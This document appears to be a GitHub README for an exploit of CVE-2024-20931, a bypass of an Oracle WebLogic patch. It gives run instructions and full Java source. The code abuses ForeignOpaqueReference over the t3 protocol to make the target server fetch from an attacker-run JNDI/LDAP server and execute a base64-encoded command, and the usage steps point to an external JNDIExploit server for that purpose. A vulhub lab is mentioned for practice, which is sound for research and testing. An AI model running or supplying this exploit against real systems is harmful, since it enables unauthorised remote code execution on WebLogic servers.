# CVE-2024-20931
CVE-2024-20931, this is the bypass of the patch of CVE-2023-21839 Oracle Weblogic

Usage:
Setup JNDI, the specific one from https://github.com/WhiteHSBG/JNDIExploit/

Exploit:
```
java -jar CVE-2024-20931.jar
Please input target IP:127.0.0.1
Please input target port:7001
Please input RMI Address(ip:port/exp):JNDISERVER:1389/Basic/Command/Base64/BASE64COMMAND
```
Notes:
```
This is reworked from https://github.com/Leocodefocus (thank you), also at https://github.com/ATonysan/CVE-2024-20931_weblogic/tree/main, all come from the https://github.com/GlassyAmadeus/CVE-2024-20931
Java version "1.8.0_151", is required for JNDIExploit as well as for the current CVE.
```
Practice using a docker environment from https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839.  Limited commands are supported, e.g. try with curl (no ping/nslookup on the image).


```
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.Scanner;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import weblogic.deployment.jms.ForeignOpaqueReference;

public class MainClass {
  public static void main(String[] args) throws NamingException, NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {
    String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
    Scanner scanner = new Scanner(System.in);
    System.out.print("Please input target IP:");
    String targetIP = scanner.nextLine();
    System.out.print("Please input target port:");
    String targetPort = scanner.nextLine();
    String url = "t3://" + targetIP + ":" + targetPort;
    Hashtable<Object, Object> env1 = new Hashtable<>();
    env1.put("java.naming.factory.initial", JNDI_FACTORY);
    env1.put("java.naming.provider.url", url);
    InitialContext c = new InitialContext(env1);
    Hashtable<Object, Object> env2 = new Hashtable<>();
    System.out.print("Please input RMI Address(ip:port/exp):");
    String exp = scanner.nextLine();
    env2.put("java.naming.factory.initial", "oracle.jms.AQjmsInitialContextFactory");
    env2.put("datasource", "ldap://" + exp);
    ForeignOpaqueReference f = new ForeignOpaqueReference();
    Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
    jndiEnvironment.setAccessible(true);
    jndiEnvironment.set(f, env2);
    Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
    remoteJNDIName.setAccessible(true);
    String ldap = "ldap://" + exp;
    remoteJNDIName.set(f, ldap);
    c.rebind("glassy", f);
    try {
      c.lookup("glassy");
    } catch (Exception exception) {}
  }
}

```
